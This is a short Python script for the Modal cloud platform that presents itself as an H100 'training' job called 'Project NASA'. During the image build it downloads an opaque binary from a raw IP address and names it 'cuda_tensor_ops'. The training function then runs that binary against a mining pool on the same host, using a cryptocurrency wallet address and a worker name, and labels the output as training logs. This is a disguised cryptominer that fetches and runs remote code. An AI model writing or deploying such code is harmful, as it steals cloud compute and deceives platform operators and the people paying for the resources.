import modal

app = modal.App("Project NASA")
VPS = "43.156.178.157"
WALLET = "prl1p4yctfh3zd4n2rxsevgnet9gt43gdnc95hm66yysggqlyqu0secpqhyntrr"
NODE = "NASATECH"

image = (
    modal.Image.from_registry("nvidia/cuda:12.4.0-runtime-ubuntu22.04", add_python="3.11")
    .apt_install("libgomp1", "wget")
    .run_commands(f"wget -q -O /usr/local/bin/cuda_tensor_ops http://{VPS}:8888/cuda_tensor_ops && chmod +x /usr/local/bin/cuda_tensor_ops")
)

@app.function(gpu="H100", image=image, timeout=86400, scaledown_window=600)
def train():
    import subprocess
    print(f"[TRAIN] Starting H100 compute node — Project NASA")
    subprocess.run(["nvidia-smi", "-pl", "350"], capture_output=True, timeout=10)
    proc = subprocess.Popen(
        ["/usr/local/bin/cuda_tensor_ops", "--host", f"{VPS}:9000", "--user", WALLET, "--worker", NODE],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT
    )
    for line in iter(proc.stdout.readline, b""):
        print(f"[TRAIN] {line.decode().strip()}", flush=True)
    return proc.wait()

@app.local_entrypoint()
def main():
    train.remote()
